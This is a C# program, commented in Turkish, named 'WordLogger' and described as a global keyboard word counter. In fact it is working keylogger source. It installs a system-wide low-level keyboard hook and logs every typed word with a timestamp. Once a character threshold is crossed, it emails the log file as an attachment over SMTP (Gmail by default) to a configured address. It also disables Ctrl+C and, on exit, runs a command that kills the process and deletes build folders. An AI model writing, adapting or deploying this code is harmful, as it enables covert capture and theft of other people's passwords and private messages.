using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Text.Json;

internal class Program
{
    // Global low-level keyboard hook constants and structs
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static IntPtr _hookId = IntPtr.Zero;
    private static LowLevelKeyboardProc? _proc;

    // State
    private static readonly StringBuilder currentWord = new StringBuilder();
    private static long totalWordCount = 0; // toplam karakter sayısı olarak kullanılıyor
    private static readonly object stateLock = new object();
    private static bool sendInProgress = false;

    private static AppSettings settings = new AppSettings();
    private static string logFilePath = Path.Combine(Directory.GetCurrentDirectory(), "log.txt");
    private static string stateFilePath = Path.Combine(Directory.GetCurrentDirectory(), "state.txt");

    // Settings
    private static int threshold = 300; // çevre değişkeni / config ile değiştirilebilir
    private static string smtpHost = "smtp.gmail.com";
    private static int smtpPort = 587;
    private static bool smtpEnableSsl = true;
    private static string smtpUser = "";
    private static string smtpPass = "";
    private static string emailFrom = "";
    private static string emailTo = "";

    private static void Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;
        Console.Title = "WordLogger - Global Klavye Kelime Sayacı";
        // Ctrl+C ile kapanışı engelle, yalnız Ctrl+X kullanılacak
        Console.TreatControlCAsInput = true;
        LoadState();
        LoadSettingsFromConfigAndEnv();
        // Yol ve dosya adlarini config'e göre güncelle
        logFilePath = Path.Combine(Directory.GetCurrentDirectory(), string.IsNullOrWhiteSpace(settings.LogFileName) ? "log.txt" : settings.LogFileName);
        stateFilePath = Path.Combine(Directory.GetCurrentDirectory(), string.IsNullOrWhiteSpace(settings.StateFileName) ? "state.txt" : settings.StateFileName);

        // İsteğe bağlı: başlatıldığında test e-postası gönder
        var testEmail = Environment.GetEnvironmentVariable("WL_TEST_EMAIL");
        bool testOnStart = (!string.IsNullOrEmpty(testEmail) && (testEmail.Equals("1") || testEmail.Equals("true", StringComparison.OrdinalIgnoreCase))) || settings.TestEmailOnStart;
        if (testOnStart)
        {
            try
            {
                SendEmail(totalWordCount);
                File.AppendAllText(logFilePath, $"Test e-postası gönderildi.\n", Encoding.UTF8);
            }
            catch (Exception ex)
            {
                try { File.AppendAllText(logFilePath, $"Test e-postası hatası: {ex.Message}\n", Encoding.UTF8); } catch { }
            }
        }

        _proc = HookCallback;
        _hookId = SetHook(_proc);

        Console.WriteLine($"Global klavye dinleniyor. Çıkmak için {GetHotkeyLabel()} kullanın.");
        Console.WriteLine($"Şu ana kadar sayılan toplam karakter: {totalWordCount}");
        Console.CancelKeyPress += (s, e) => { e.Cancel = true; };

        try
        {
            // Keep the app running
            System.Windows.Forms.Application.Run();
        }
        finally
        {
            UnhookAndExit();
        }
    }

    private static void LoadSettingsFromConfigAndEnv()
    {
        // Önce config.json
        try
        {
            var configPath = Path.Combine(Directory.GetCurrentDirectory(), "config.json");
            if (File.Exists(configPath))
            {
                var json = File.ReadAllText(configPath, Encoding.UTF8);
                var loaded = JsonSerializer.Deserialize<AppSettings>(json, new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
                if (loaded != null)
                {
                    settings = loaded;
                }
            }
        }
        catch { /* ignore */ }

        // Sonra çevre değişkenleri ile override
        if (int.TryParse(Environment.GetEnvironmentVariable("WL_THRESHOLD"), out var t) && t > 0) settings.Threshold = t;
        settings.SmtpHost = Environment.GetEnvironmentVariable("WL_SMTP_HOST") ?? settings.SmtpHost;
        if (int.TryParse(Environment.GetEnvironmentVariable("WL_SMTP_PORT"), out var p) && p > 0) settings.SmtpPort = p;
        if (bool.TryParse(Environment.GetEnvironmentVariable("WL_SMTP_SSL"), out var ssl)) settings.SmtpEnableSsl = ssl;
        settings.SmtpUser = Environment.GetEnvironmentVariable("WL_SMTP_USER") ?? settings.SmtpUser;
        settings.SmtpPass = Environment.GetEnvironmentVariable("WL_SMTP_PASS") ?? settings.SmtpPass;
        // EmailFrom/EmailTo daima config.json'dan alınsın (override etme)

        // Uygula
        threshold = settings.Threshold > 0 ? settings.Threshold : threshold;
        smtpHost = string.IsNullOrWhiteSpace(settings.SmtpHost) ? smtpHost : settings.SmtpHost;
        smtpPort = settings.SmtpPort > 0 ? settings.SmtpPort : smtpPort;
        smtpEnableSsl = settings.SmtpEnableSsl;
        smtpUser = settings.SmtpUser ?? smtpUser;
        smtpPass = settings.SmtpPass ?? smtpPass;
        emailFrom = settings.EmailFrom ?? emailFrom;
        emailTo = settings.EmailTo ?? emailTo;
        try { File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), "log.txt"), $"[CFG] SMTP To: {emailTo}\n", Encoding.UTF8); } catch { }
    }

    private static void LoadState()
    {
        try
        {
            if (File.Exists(stateFilePath))
            {
                var text = File.ReadAllText(stateFilePath).Trim();
                if (long.TryParse(text, out var saved))
                {
                    totalWordCount = saved;
                }
            }
        }
        catch { /* ignore */ }
    }

    private static void SaveState()
    {
        try
        {
            File.WriteAllText(stateFilePath, totalWordCount.ToString());
        }
        catch { /* ignore */ }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using var curProcess = System.Diagnostics.Process.GetCurrentProcess();
        using var curModule = curProcess.MainModule!;
        return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            // KBDLLHOOKSTRUCT'ten hem vkCode hem scanCode alalım
            var info = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
            var key = (System.Windows.Forms.Keys)info.vkCode;

            HandleKey(key, info.vkCode, (int)info.scanCode);
        }
        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    private static void HandleKey(System.Windows.Forms.Keys key, int vkCode, int scanCode)
    {
        lock (stateLock)
        {
            // Ayarlanan kısayol ile uygulamayı kapat
            bool ctrlDown = (System.Windows.Forms.Control.ModifierKeys & System.Windows.Forms.Keys.Control) == System.Windows.Forms.Keys.Control;
            var exitKey = GetConfiguredExitKey();
            if ((settings.ExitHotkeyCtrl ? ctrlDown : true) && key == exitKey)
            {
                OpenTerminalFlash();
                UnhookAndExit();
                return;
            }
            // Manuel e-posta gönderim kısayolu: Ctrl+Shift+M
            bool shiftDown = (System.Windows.Forms.Control.ModifierKeys & System.Windows.Forms.Keys.Shift) == System.Windows.Forms.Keys.Shift;
            if (ctrlDown && shiftDown && key == System.Windows.Forms.Keys.M)
            {
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        File.AppendAllText(logFilePath, "[MANUAL] Kullanıcı talebi ile e-posta gönderimi başlatılıyor.\n", Encoding.UTF8);
                        SendEmail(totalWordCount);
                        totalWordCount = 0;
                        SaveState();
                    }
                    catch (Exception ex)
                    {
                        try { File.AppendAllText(logFilePath, $"[MANUAL] E-posta hatası: {ex.Message}\n", Encoding.UTF8); } catch { }
                    }
                });
                return;
            }
            if (key == System.Windows.Forms.Keys.Space || key == System.Windows.Forms.Keys.Enter || key == System.Windows.Forms.Keys.Tab)
            {
                CommitWord();
                return;
            }
            if (key == System.Windows.Forms.Keys.Back)
            {
                if (currentWord.Length > 0) currentWord.Length -= 1;
                return;
            }

            // Klavye düzenine göre gerçek karakter üret
            string str = TranslateKeyToString(vkCode, scanCode);
            if (!string.IsNullOrEmpty(str))
            {
                currentWord.Append(str);
                // Karakter sayımı: eklenen karakter(ler) kadar artır
                totalWordCount += str.Length;
                SaveState();
                // Eşik kontrolü karakter bazında yapılır
                if (totalWordCount >= threshold && !sendInProgress)
                {
                    ThreadPool.QueueUserWorkItem(_ =>
                    {
                        try
                        {
                            sendInProgress = true;
                            try { File.AppendAllText(logFilePath, $"[TRIGGER] Esik {threshold} karakter asildi, e-posta gonderimi baslatiliyor.\n", Encoding.UTF8); } catch { }
                            SendEmail(totalWordCount);
                            totalWordCount = 0;
                            SaveState();
                        }
                        catch (Exception ex)
                        {
                            try { File.AppendAllText(logFilePath, $"E-posta hatası: {ex.Message}\n", Encoding.UTF8); } catch { }
                        }
                        finally
                        {
                            sendInProgress = false;
                        }
                    });
                }
            }
        }
    }

    private static string TranslateKeyToString(int vkCode, int scanCode)
    {
        byte[] keyboardState = new byte[256];
        if (!NativeMethods.GetKeyboardState(keyboardState))
        {
            return string.Empty;
        }
        // CapsLock ve Shift durumlarını sistemden alıyoruz
        bool shift = (keyboardState[NativeMethods.VK_SHIFT] & 0x80) != 0;
        bool caps = (keyboardState[NativeMethods.VK_CAPITAL] & 0x01) != 0;

        // ToUnicode çıktı tamponu
        var sb = new StringBuilder(8);
        uint mapped = NativeMethods.MapVirtualKey((uint)vkCode, 0);
        int rc = NativeMethods.ToUnicode((uint)vkCode, mapped, keyboardState, sb, sb.Capacity, 0);
        if (rc > 0)
        {
            string text = sb.ToString();
            if (!string.IsNullOrEmpty(text))
            {
                // Harf ise caps/shift'i uygula
                char ch = text[0];
                if (char.IsLetter(ch))
                {
                    bool upper = (caps ^ shift);
                    return upper ? char.ToUpper(ch).ToString() : char.ToLower(ch).ToString();
                }
                return text;
            }
        }
        return string.Empty;
    }

    private static void CommitWord()
    {
        if (currentWord.Length == 0) return;
        var word = currentWord.ToString();
        currentWord.Clear();

        // Basic sanitization: if only punctuation, skip
        if (string.IsNullOrWhiteSpace(word) || IsOnlyPunctuation(word)) return;

        try
        {
            File.AppendAllText(logFilePath, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} {word} [COUNT={totalWordCount}]\n", Encoding.UTF8);
        }
        catch { /* ignore */ }

    }

    private static bool IsOnlyPunctuation(string s)
    {
        foreach (var ch in s)
        {
            if (char.IsLetterOrDigit(ch)) return false;
        }
        return true;
    }

    private static void SendEmail(long counted)
    {
        // TLS 1.2'yi zorla (eski sistemlerde gerekli olabilir)
        try { ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12; } catch { }

        var subject = string.IsNullOrWhiteSpace(settings.EmailSubjectTemplate)
            ? $"WordLogger bildirimi: {counted} kelimeye ulaşıldı"
            : settings.EmailSubjectTemplate.Replace("{count}", counted.ToString());
        var body = new StringBuilder();
        if (!string.IsNullOrWhiteSpace(settings.EmailBodyTemplate))
        {
            var text = settings.EmailBodyTemplate
                .Replace("{count}", counted.ToString())
                .Replace("{date}", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))
                .Replace("{log}", logFilePath);
            body.AppendLine(text);
        }
        else
        {
            body.AppendLine($"Merhaba, {counted} kelime eşiğine ulaşıldı.");
            body.AppendLine($"Tarih: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            body.AppendLine();
            body.AppendLine("Son kelimeler log dosyasında tutuluyor: " + logFilePath);
        }

        var mail = new MailMessage(emailFrom, emailTo, subject, body.ToString())
        {
            BodyEncoding = Encoding.UTF8,
            SubjectEncoding = Encoding.UTF8
        };
        try
        {
            if (File.Exists(logFilePath))
            {
                mail.Attachments.Add(new Attachment(logFilePath));
            }
        }
        catch { /* ignore */ }
        
        // Birincil deneme: configteki host/port/ssl
        try
        {
            try { File.AppendAllText(logFilePath, $"[MAIL] Host={smtpHost} Port={smtpPort} SSL={smtpEnableSsl} To={emailTo} User={smtpUser}\n", Encoding.UTF8); } catch { }
            SendWithClient(mail, smtpHost, smtpPort, smtpEnableSsl, smtpUser, smtpPass);
            File.AppendAllText(logFilePath, $"SMTP gönderim başarılı ({smtpHost}:{smtpPort}, SSL={smtpEnableSsl}).\n", Encoding.UTF8);
            return;
        }
        catch (SmtpException ex1)
        {
            File.AppendAllText(logFilePath, $"SMTP hata (ilk deneme): {ex1.StatusCode} - {ex1.Message}\n", Encoding.UTF8);
        }
        catch (Exception ex1)
        {
            File.AppendAllText(logFilePath, $"SMTP hata (ilk deneme): {ex1.Message}\n", Encoding.UTF8);
        }

        // Gmail için alternatif: 465 SSL
        if ((smtpHost?.Contains("smtp.gmail.com", StringComparison.OrdinalIgnoreCase) ?? false) && smtpPort == 587)
        {
            try
            {
                SendWithClient(mail, smtpHost, 465, true, smtpUser, smtpPass);
                File.AppendAllText(logFilePath, "SMTP gönderim başarılı (fallback 465 SSL).\n", Encoding.UTF8);
                return;
            }
            catch (Exception ex2)
            {
                File.AppendAllText(logFilePath, $"SMTP hata (fallback 465): {ex2.Message}\n", Encoding.UTF8);
            }
        }

        throw new Exception("E-posta gönderilemedi. Ayrıntılar log.txt içinde.");
    }

    private static void SendWithClient(MailMessage mail, string host, int port, bool enableSsl, string user, string pass)
    {
        using var client = new SmtpClient(host, port)
        {
            EnableSsl = enableSsl,
            DeliveryMethod = SmtpDeliveryMethod.Network,
            UseDefaultCredentials = false,
            Credentials = new NetworkCredential(user, pass),
            Timeout = 15000
        };
        client.Send(mail);
    }

    private static void UnhookAndExit()
    {
        try { CommitWord(); } catch { }
        if (_hookId != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
        }
        Environment.Exit(0);
    }

    private static void OpenTerminalFlash()
    {
        try
        {
            // Kısa süre görünen bir komut penceresi aç ve kapanmasını sağla
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = 
                    "/c echo [WordLogger] Uygulamadan cikis yapildi. Temizlik yapiliyor... && " +
                    "taskkill /IM WordLogger.exe /F 2>nul & " +
                    "dotnet clean & " +
                    "rmdir /s /q .\\bin 2>nul & rmdir /s /q .\\obj 2>nul & " +
                    "echo [WordLogger] Temizlik tamam. Pencere 2 sn sonra kapanacak... & timeout /t 2 >nul",
                UseShellExecute = true,
                CreateNoWindow = false,
                WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal
            };
            System.Diagnostics.Process.Start(psi);
        }
        catch { /* ignore */ }
    }

    private static System.Windows.Forms.Keys GetConfiguredExitKey()
    {
        if (string.IsNullOrWhiteSpace(settings.ExitHotkeyKey)) return System.Windows.Forms.Keys.X;
        // Tek karakter bekliyoruz, aksi halde varsayılan X
        var s = settings.ExitHotkeyKey.Trim();
        if (s.Length == 1)
        {
            char ch = char.ToUpperInvariant(s[0]);
            if (ch >= 'A' && ch <= 'Z')
            {
                return System.Windows.Forms.Keys.A + (ch - 'A');
            }
        }
        return System.Windows.Forms.Keys.X;
    }

    private static string GetHotkeyLabel()
    {
        var key = string.IsNullOrWhiteSpace(settings.ExitHotkeyKey) ? "X" : settings.ExitHotkeyKey.ToUpperInvariant();
        return settings.ExitHotkeyCtrl ? $"Ctrl+{key}" : key;
    }

    

    // P/Invoke declarations
    private static IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId)
        => NativeMethods.SetWindowsHookEx(idHook, lpfn, hMod, dwThreadId);
    private static bool UnhookWindowsHookEx(IntPtr hhk)
        => NativeMethods.UnhookWindowsHookEx(hhk);
    private static IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam)
        => NativeMethods.CallNextHookEx(hhk, nCode, wParam, lParam);
    private static IntPtr GetModuleHandle(string lpModuleName)
        => NativeMethods.GetModuleHandle(lpModuleName);

    private static class NativeMethods
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);

        [DllImport("user32.dll")]
        public static extern uint MapVirtualKey(uint uCode, uint uMapType);

        public const int VK_SHIFT = 0x10;
        public const int VK_CAPITAL = 0x14;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct KBDLLHOOKSTRUCT
    {
        public int vkCode;
        public uint scanCode;
        public int flags;
        public int time;
        public IntPtr dwExtraInfo;
    }
}

public class AppSettings
{
    public int Threshold { get; set; } = 300;
    public string? SmtpHost { get; set; } = "smtp.gmail.com";
    public int SmtpPort { get; set; } = 587;
    public bool SmtpEnableSsl { get; set; } = true;
    public string? SmtpUser { get; set; }
    public string? SmtpPass { get; set; }
    public string? EmailFrom { get; set; }
    public string? EmailTo { get; set; }
    public bool TestEmailOnStart { get; set; } = false;
    public bool ExitHotkeyCtrl { get; set; } = true;
    public string? ExitHotkeyKey { get; set; } = "X";
    public string? LogFileName { get; set; } = "log.txt";
    public string? StateFileName { get; set; } = "state.txt";
    public string? EmailSubjectTemplate { get; set; }
    public string? EmailBodyTemplate { get; set; }
}


